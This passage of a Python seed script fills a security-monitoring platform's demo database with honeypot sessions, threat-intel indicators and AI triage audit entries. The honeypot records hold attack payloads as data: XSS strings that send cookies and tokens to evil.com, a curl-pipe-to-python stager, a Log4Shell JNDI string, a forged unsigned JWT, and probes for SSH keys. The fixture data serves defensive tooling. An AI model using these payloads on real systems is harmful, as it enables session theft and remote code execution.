             "payloads": ["Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."], "attacker": 2},
            {"hp": 1, "src_ip": "198.51.100.44", "port": 60001, "proto": "http", "duration": 89,
             "commands": ["GET /", "GET /admin", "POST /api/v1/users", "GET /api/v1/search?q=test"],
             "creds": [],
             "payloads": ["<img src=x onerror=fetch('https://evil.com/c?d='+document.cookie)>", "javascript:alert(document.domain)", "<svg/onload=prompt(1)>"], "attacker": 4},
            # SMB honeypot interactions
            {"hp": 2, "src_ip": "103.75.201.18", "port": 49999, "proto": "smb", "duration": 240,
             "commands": ["NET VIEW \\\\FILESERVER01", "DIR \\\\FILESERVER01\\Documents$", "DIR \\\\FILESERVER01\\IT-Tools", "COPY \\\\FILESERVER01\\IT-Tools\\vpn-config.ovpn"],
             "creds": [{"user": "DEMOCORP\\admin", "pass": "Winter2024!"}],
             "payloads": [], "attacker": 2},
            {"hp": 2, "src_ip": "185.220.101.34", "port": 50001, "proto": "smb", "duration": 15,
             "commands": ["NET VIEW \\\\FILESERVER01"],
             "creds": [{"user": "guest", "pass": ""}, {"user": "admin", "pass": "admin"}],
             "payloads": [], "attacker": 0},
            # API honeypot interactions
            {"hp": 3, "src_ip": "45.155.205.110", "port": 43210, "proto": "https", "duration": 180,
             "commands": ["GET /api/v1/users", "GET /api/v1/admin", "POST /api/v1/auth/login", "GET /graphql", "GET /api/internal/config"],
             "creds": [{"user": "admin", "pass": "admin"}, {"user": "api", "pass": "api123"}],
             "payloads": ["query { users { id email password } }", "{ \"query\": \"mutation { createAdmin(email: \\\"hacker@evil.com\\\") { token } }\" }"], "attacker": 1},
            {"hp": 3, "src_ip": "103.75.201.20", "port": 43211, "proto": "https", "duration": 420,
             "commands": ["GET /api/v1/users", "GET /api/v1/admin/config", "POST /api/v1/auth/token", "GET /api/internal/config", "PUT /api/v1/admin/users/1", "DELETE /api/v1/admin/logs"],
             "creds": [{"user": "admin@democorp.com", "pass": "Admin2024!"}],
             "payloads": ["Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."], "attacker": 2},
            {"hp": 3, "src_ip": "198.51.100.44", "port": 43212, "proto": "https", "duration": 60,
             "commands": ["GET /api/v1/users/me", "GET /api/v1/search?q=<script>alert(1)</script>"],
             "creds": [],
             "payloads": ["<script>document.location='https://evil.com/steal?t='+localStorage.getItem('token')</script>"], "attacker": 4},
            # More SSH
            {"hp": 0, "src_ip": "45.155.205.108", "port": 61000, "proto": "ssh", "duration": 5,
             "commands": ["id"],
             "creds": [{"user": "root", "pass": "123456"}, {"user": "admin", "pass": "admin"}],
             "payloads": [], "attacker": 1},
            # More HTTP
            {"hp": 1, "src_ip": "193.32.162.89", "port": 62000, "proto": "http", "duration": 30,
             "commands": ["POST /wp-login.php", "POST /wp-login.php", "POST /wp-login.php", "POST /wp-login.php"],
             "creds": [{"user": "admin", "pass": "qwerty123"}, {"user": "admin", "pass": "welcome1"}, {"user": "admin", "pass": "changeme"}, {"user": "admin", "pass": "Summer2024"}],
             "payloads": [], "attacker": 3},
            {"hp": 1, "src_ip": "193.32.162.90", "port": 62001, "proto": "http", "duration": 25,
             "commands": ["POST /api/v1/auth/login", "POST /api/v1/auth/login", "POST /api/v1/auth/login"],
             "creds": [{"user": "john@democorp.com", "pass": "password123"}, {"user": "jane@democorp.com", "pass": "Welcome1!"}, {"user": "admin@democorp.com", "pass": "admin2024"}],
             "payloads": [], "attacker": 3},
            # SMB additional
            {"hp": 2, "src_ip": "193.32.162.91", "port": 50100, "proto": "smb", "duration": 10,
             "commands": ["NET VIEW \\\\FILESERVER01"],
             "creds": [{"user": "admin", "pass": "P@ssword1"}, {"user": "administrator", "pass": "Welcome1"}],
             "payloads": [], "attacker": 3},
            # API additional
            {"hp": 3, "src_ip": "193.32.162.92", "port": 43300, "proto": "https", "duration": 45,
             "commands": ["POST /api/v1/auth/login", "POST /api/v1/auth/login", "POST /api/v1/auth/login", "POST /api/v1/auth/login"],
             "creds": [{"user": "user1@democorp.com", "pass": "Pass123!"}, {"user": "user2@democorp.com", "pass": "Qwerty1!"}, {"user": "ceo@democorp.com", "pass": "Company2024"}],
             "payloads": [], "attacker": 3},
            # More advanced
            {"hp": 0, "src_ip": "103.75.201.18", "port": 49877, "proto": "ssh", "duration": 600,
             "commands": ["id", "uname -a", "cat /etc/os-release", "ls -la /home/", "find / -name '*.pem' 2>/dev/null", "cat /root/.ssh/authorized_keys", "history", "iptables -L -n", "ss -tlnp", "ps aux"],
             "creds": [{"user": "root", "pass": "P@ssw0rd!2024"}],
             "payloads": ["curl -s http://103.75.201.18:8443/stager.py | python3 -"], "attacker": 2},
            {"hp": 1, "src_ip": "103.75.201.20", "port": 44400, "proto": "http", "duration": 540,
             "commands": ["GET /", "GET /robots.txt", "GET /sitemap.xml", "GET /.well-known/security.txt", "GET /api/v1/health", "GET /api/v1/docs", "POST /api/v1/auth/login", "GET /api/v1/users", "GET /api/v1/admin/system-info"],
             "creds": [{"user": "admin", "pass": "admin"}, {"user": "admin@democorp.com", "pass": "Admin!2024"}],
             "payloads": ["${jndi:ldap://103.75.201.20:1389/exploit}", "{{constructor.constructor('return this')()}}"], "attacker": 2},
        ]

        for ix in interactions_data:
            session.add(HoneypotInteraction(
                id=uid(),
                honeypot_id=honeypot_ids[ix["hp"]],
                client_id=client_id,
                source_ip=ix["src_ip"],
                source_port=ix["port"],
                protocol=ix["proto"],
                commands=ix["commands"],
                credentials_tried=ix["creds"],
                payloads=ix["payloads"],
                session_duration=ix["duration"],
                attacker_profile_id=attacker_ids[ix["attacker"]],
                raw_log=f"Session from {ix['src_ip']}:{ix['port']} to honeypot {honeypots_data[ix['hp']]['name']}",
                timestamp=past(random.randint(0, 14)),
            ))
        print(f"  [+] Honeypot Interactions: {len(interactions_data)}")

        # =============================================
        # 9. THREAT INTEL IOCs (30)
        # =============================================
        iocs_data = [
            # IP indicators
            {"type": "ip", "value": "185.220.101.34", "threat": "Tor Exit Node - SSH Brute Force", "confidence": 0.95, "source": "honeypot", "tags": ["tor", "brute-force", "ssh"]},
            {"type": "ip", "value": "185.220.101.35", "threat": "Tor Exit Node - Scanning", "confidence": 0.90, "source": "honeypot", "tags": ["tor", "scanning"]},
            {"type": "ip", "value": "45.155.205.108", "threat": "SQL Injection Source", "confidence": 0.98, "source": "internal", "tags": ["sqli", "web-attack", "automated"]},
            {"type": "ip", "value": "45.155.205.109", "threat": "Web Application Scanner", "confidence": 0.85, "source": "honeypot", "tags": ["scanning", "recon"]},
            {"type": "ip", "value": "45.155.205.110", "threat": "API Enumeration Source", "confidence": 0.80, "source": "honeypot", "tags": ["api-abuse", "enumeration"]},
            {"type": "ip", "value": "103.75.201.18", "threat": "APT C2 Server", "confidence": 0.99, "source": "internal", "tags": ["apt", "c2", "cobalt-strike", "critical"]},
            {"type": "ip", "value": "103.75.201.20", "threat": "APT Infrastructure", "confidence": 0.95, "source": "internal", "tags": ["apt", "infrastructure"]},
            {"type": "ip", "value": "193.32.162.89", "threat": "Credential Stuffing Proxy", "confidence": 0.92, "source": "internal", "tags": ["credential-stuffing", "proxy"]},
            {"type": "ip", "value": "193.32.162.90", "threat": "Credential Stuffing Proxy", "confidence": 0.88, "source": "internal", "tags": ["credential-stuffing", "proxy"]},
            {"type": "ip", "value": "198.51.100.44", "threat": "XSS Attacker", "confidence": 0.75, "source": "internal", "tags": ["xss", "web-attack"]},
            {"type": "ip", "value": "91.134.174.202", "threat": "Suspicious Login Source (GeoIP anomaly)", "confidence": 0.60, "source": "internal", "tags": ["anomaly", "geo-mismatch"]},
            # Domain indicators
            {"type": "domain", "value": "xf7k2.attacker-c2.xyz", "threat": "DNS Tunneling C2 Domain", "confidence": 0.99, "source": "internal", "tags": ["c2", "dns-tunnel", "exfiltration"]},
            {"type": "domain", "value": "evil.com", "threat": "Known Phishing and Data Exfil Domain", "confidence": 0.90, "source": "community", "tags": ["phishing", "exfiltration"]},
            {"type": "domain", "value": "malware-cdn.darknet.io", "threat": "Malware Distribution", "confidence": 0.95, "source": "community", "tags": ["malware", "distribution"]},
            {"type": "domain", "value": "login-democorp.phishing.site", "threat": "Credential Phishing (brand impersonation)", "confidence": 0.97, "source": "community", "tags": ["phishing", "brand-impersonation"]},
            {"type": "domain", "value": "c2-beacon.darkops.net", "threat": "Cobalt Strike Beacon Domain", "confidence": 0.93, "source": "community", "tags": ["c2", "cobalt-strike"]},
            # Hash indicators
            {"type": "hash", "value": "a3f5b9c2d1e4f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1", "threat": "Cobalt Strike Beacon (x64)", "confidence": 0.99, "source": "internal", "tags": ["cobalt-strike", "beacon", "malware"]},
            {"type": "hash", "value": "b4e6c8d0f2a1b3c5d7e9f1a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2", "threat": "SSH Brute Force Tool", "confidence": 0.85, "source": "honeypot", "tags": ["brute-force", "tool"]},
            {"type": "hash", "value": "c5f7d9e1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7", "threat": "Python Reverse Shell Payload", "confidence": 0.92, "source": "internal", "tags": ["reverse-shell", "payload"]},
            {"type": "hash", "value": "d6a8e0f2b4c6d8a0e2f4b6c8d0a2e4f6b8c0d2a4e6f8b0c2d4a6e8f0b2c4d6a8", "threat": "Mimikatz (obfuscated)", "confidence": 0.97, "source": "community", "tags": ["mimikatz", "credential-theft"]},
            # URL indicators
            {"type": "url", "value": "http://103.75.201.18/implant.sh", "threat": "Malware Dropper Script", "confidence": 0.99, "source": "honeypot", "tags": ["dropper", "malware", "shell-script"]},
            {"type": "url", "value": "http://103.75.201.18:8443/stager.py", "threat": "Python Stager (C2)", "confidence": 0.99, "source": "honeypot", "tags": ["stager", "c2", "python"]},
            {"type": "url", "value": "http://103.75.201.18/beacon", "threat": "Cobalt Strike Beacon Binary", "confidence": 0.98, "source": "honeypot", "tags": ["cobalt-strike", "beacon"]},
            {"type": "url", "value": "https://evil.com/steal", "threat": "Data Exfiltration Endpoint", "confidence": 0.90, "source": "internal", "tags": ["exfiltration", "xss"]},
            {"type": "url", "value": "https://login-democorp.phishing.site/auth", "threat": "Credential Phishing Page", "confidence": 0.97, "source": "community", "tags": ["phishing", "credential-theft"]},
            # Email indicators
            {"type": "email", "value": "hacker@evil.com", "threat": "Associated with XSS/Phishing Campaigns", "confidence": 0.70, "source": "honeypot", "tags": ["phishing", "xss"]},
            {"type": "email", "value": "admin@darkops.net", "threat": "C2 Registration Email", "confidence": 0.80, "source": "community", "tags": ["c2", "registration"]},
            {"type": "email", "value": "support@login-democorp.phishing.site", "threat": "Phishing Campaign Sender", "confidence": 0.95, "source": "community", "tags": ["phishing", "social-engineering"]},
            # Additional high-value
            {"type": "domain", "value": "ns1.attacker-c2.xyz", "threat": "DNS Tunneling NS Server", "confidence": 0.98, "source": "internal", "tags": ["dns-tunnel", "c2", "infrastructure"]},
            {"type": "ip", "value": "94.232.45.12", "threat": "Known Ransomware C2", "confidence": 0.88, "source": "community", "tags": ["ransomware", "c2"]},
        ]

        for ioc in iocs_data:
            session.add(ThreatIntel(
                id=uid(),
                ioc_type=ioc["type"],
                ioc_value=ioc["value"],
                threat_type=ioc["threat"],
                confidence=ioc["confidence"],
                source=ioc["source"],
                tags=ioc["tags"],
                first_seen=past(random.randint(7, 90)),
                last_seen=past(random.randint(0, 7)),
                expires_at=datetime.utcnow() + timedelta(days=random.randint(30, 180)),
            ))
        print(f"  [+] Threat Intel IOCs: {len(iocs_data)}")

        # =============================================
        # 10. AUDIT LOG (10)
        # =============================================
        audit_data = [
            {"action": "incident_triage", "model": "openrouter/quasar-alpha", "decision": "escalate_to_critical",
             "input": "SSH brute force: 847 attempts from Tor exit node 185.220.101.34",
             "reasoning": "High volume brute force from known Tor exit node targeting production database. Auto-escalated based on target criticality and attack persistence.",
             "confidence": 0.92, "tokens": 1250, "cost": 0.0, "latency": 1200},
            {"action": "threat_classification", "model": "openrouter/hunter-alpha", "decision": "classify_as_apt",
             "input": "Jenkins compromise + Cobalt Strike beacon + lateral movement indicators",
             "reasoning": "Attack chain analysis: Initial access via Jenkins script console -> download Cobalt Strike beacon -> attempt lateral movement. Tool sophistication and methodology consistent with APT-level threat actor.",
             "confidence": 0.88, "tokens": 3400, "cost": 0.0, "latency": 4500},
            {"action": "auto_block_ip", "model": "stepfun/step-3.5-flash:free", "decision": "block_185.220.101.34",
             "input": "Source IP 185.220.101.34 - 847 failed SSH logins in 15 minutes",
             "reasoning": "Exceeds threshold of 10 failed attempts. Source is Tor exit node (high risk). Auto-block within guardrail parameters.",
             "confidence": 0.98, "tokens": 450, "cost": 0.0, "latency": 340},
            {"action": "vulnerability_risk_scoring", "model": "arcee-ai/trinity-large-preview:free", "decision": "risk_score_9.8",
             "input": "CVE-2024-31210 on web.democorp.com (internet-facing WordPress)",
             "reasoning": "Critical CVSS 9.8 RCE on internet-facing asset with public exploit available. Business context: handles customer-facing content. Contextual risk elevated due to ease of exploitation and exposure.",
             "confidence": 0.95, "tokens": 2100, "cost": 0.0, "latency": 2800},
            {"action": "remediation_suggestion", "model": "openrouter/healer-alpha", "decision": "patch_and_harden",
             "input": "WordPress 6.4.2 with CVE-2024-31210",
             "reasoning": "Recommended: 1) Immediate WordPress update to 6.4.4. 2) WAF rule for REST API endpoint protection. 3) Disable XML-RPC. 4) Enable auto-updates for minor versions.",
             "confidence": 0.90, "tokens": 1800, "cost": 0.0, "latency": 3200},
            {"action": "incident_triage", "model": "openrouter/quasar-alpha", "decision": "escalate_to_critical",
             "input": "DNS exfiltration: 5000+ TXT queries to xf7k2.attacker-c2.xyz from db-prod-01",
             "reasoning": "DNS tunneling pattern detected from production database server. Estimated 2.5MB data exfiltrated. Critical: database server may contain PII/financial data. Immediate isolation recommended.",
             "confidence": 0.96, "tokens": 1600, "cost": 0.0, "latency": 1400},
            {"action": "attacker_profiling", "model": "openrouter/hunter-alpha", "decision": "profile_apt41_match",
             "input": "103.75.201.18 activity: Cobalt Strike, custom PowerShell, Jenkins exploit chain",
             "reasoning": "TTP analysis correlates with APT41: use of Cobalt Strike with custom malleable profiles, exploitation of CI/CD infrastructure, living-off-the-land techniques. Geographic indicators (Hong Kong) consistent with known APT41 infrastructure.",
             "confidence": 0.72, "tokens": 4200, "cost": 0.0, "latency": 5100},
            {"action": "decoy_generation", "model": "minimax/minimax-m2.5:free", "decision": "generate_fake_credentials",
             "input": "Generate convincing fake credentials for SSH honeypot ssh-trap-01",
             "reasoning": "Generated 20 fake user accounts with realistic names, weak passwords, and /home directories. Honeypot will capture interaction patterns for attacker profiling.",
             "confidence": 0.85, "tokens": 800, "cost": 0.0, "latency": 1100},
            {"action": "approval_request", "model": "stepfun/step-3.5-flash:free", "decision": "require_human_approval",
             "input": "Isolate db-prod-01.internal - production database server",
             "reasoning": "Action exceeds guardrail threshold: host isolation of production database requires human approval. Impact assessment: 3 dependent services will lose database connectivity. Alternative: network ACL to block outbound DNS to suspicious domains while maintaining service availability.",
             "confidence": 0.94, "tokens": 680, "cost": 0.0, "latency": 380},
            {"action": "credential_rotation", "model": "openrouter/quasar-alpha", "decision": "force_reset_12_accounts",
             "input": "12 successful credential stuffing logins on auth.democorp.com",
             "reasoning": "12 accounts confirmed compromised via credential stuffing. Immediate action: force password reset, invalidate all active sessions (34 sessions across compromised accounts), enforce MFA enrollment. Notify affected users via email.",
             "confidence": 0.97, "tokens": 1100, "cost": 0.0, "latency": 950},
        ]

        for ad in audit_data:
            session.add(AuditLog(
                id=uid(),
                client_id=client_id,
                incident_id=random.choice(incident_ids),
                action=ad["action"],
                model_used=ad["model"],
                input_summary=ad["input"],
                ai_reasoning=ad["reasoning"],
                decision=ad["decision"],
                confidence=ad["confidence"],
                tokens_used=ad["tokens"],
                cost_usd=ad["cost"],
                latency_ms=ad["latency"],
                timestamp=past(random.randint(0, 14)),
            ))
        print(f"  [+] Audit Log entries: {len(audit_data)}")

        # Commit all data
        await session.commit()
        print("")
        print("[SEED] Database seeded successfully!")
        print("  Demo API Key: (see AEGIS_API_KEY env var or .env file)")
        print("  Demo Client: Demo Corp (slug: demo)")
        print("")
        print("  Summary:")
        print("    1 client")
        print("    15 assets")
        print("    25 vulnerabilities")
        print("    10 incidents")
        print("    5 response actions")
        print("    5 honeypots")
        print("    20 honeypot interactions")
        print("    5 attacker profiles")
        print("    30 threat intel IOCs")
        print("    10 audit log entries")

    await engine.dispose()


if __name__ == "__main__":
    asyncio.run(seed())
